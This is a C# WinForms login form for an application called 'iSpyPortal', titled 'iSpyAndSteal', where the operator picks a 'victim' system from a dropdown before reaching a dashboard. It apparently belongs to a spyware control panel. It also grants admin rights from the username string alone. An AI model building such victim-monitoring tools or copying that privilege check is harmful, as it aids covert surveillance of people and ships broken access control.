using iSpyPortal;
using iSpyPortal.Dashboards;
using iSpyPortal.ServiceReference1;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Telerik.WinControls;
using Utilities;

namespace iSpyPortal
{
    
    public partial class Login : Telerik.WinControls.UI.ShapedForm
    {


        public Login()
        {
            InitializeComponent();
            RadMessageBox.ThemeName = "TelerikMetroBlue";
            //RadMessageBox.ShowInTaskbar = true;
        }







        private void btnLogin_Click(object sender, EventArgs e)
        {
            var client = new ServiceClient();
            btnLogin.Focus();
            var x = StringExtensions.ToPassword(txtPassword.Text.Trim());
            var user = client.AuthenticateUser(txtUserName.Text.Trim(), StringExtensions.ToPassword(txtPassword.Text.Trim()),this.ddlVictim.SelectedItem.Value.ToString());
            if (user != null)
            {

                btnLogin.Enabled = true;
                radDesktopAlert1.ThemeName = "Crystal";
                radDesktopAlert1.CaptionText = "Login Successfully";
                radDesktopAlert1.ContentText = "Please wait authentication in process,Your Patience will be higghly appricaited. " +
                    "System has been identified the Service, You have been log in to the system successfully.";
                radDesktopAlert1.PlaySound = true;

                radDesktopAlert1.Show();

                this.Hide();
                LoginManagment.UserID = user.USER_ID.ToString();
                LoginManagment.UserName = user.LOGIN_NAME;
                LoginManagment.SYSTEM_ID = int.Parse(this.ddlVictim.SelectedItem.Text.ToString());
                LoginManagment.MAC_ADDRESS = user.MAC_ADDRESS;
                LoginManagment.Timer = 15000;



               

                if (LoginManagment.UserName.ToUpper() == "ADMIN" || LoginManagment.UserName.ToUpper() == "ROOT"
                || LoginManagment.UserName.ToUpper() == "ADMINISTRATOR")
                {
                    LoginManagment.IsAdmin = true;
                }
                else
                    LoginManagment.IsAdmin = false;
               
                var dash = new Dashboard();
                dash.Show();
               

                lblInValidPassword.Visible = false;
                lblInValidPassword.Visible = false;
            }
            else
            {
                lblInValidPassword.Visible = true;
                lblInValidPassword.Visible = true;
            }


        }
      

        public void Bind()
        {
             
            this.ddlVictim.DataSource = new ServiceClient().GetAllSystem();
            this.ddlVictim.DisplayMember = "Text";
            this.ddlVictim.ValueMember = "Value";
        }

        private void Login_Load(object sender, EventArgs e)
        {
            Bind();
            radTitleBar1.Text = "iSpyAndSteal";
           
        }

        private void Login_FormClosing(object sender, FormClosingEventArgs e)
        {
            //LoginManagment.Dispose();
            Application.ExitThread();
            Application.Exit();
        }

        private void btnLogin_ToolTipTextNeeded(object sender, ToolTipTextNeededEventArgs e)
        {
            e.ToolTipText = "Click here to Login";
            e.ToolTip.UseAnimation = true;
        }

        private void txtPassword_KeyDown(object sender, KeyEventArgs e)
        {


        }

        private void txtUserName_Validated(object sender, EventArgs e)
        {

        }
    }
}
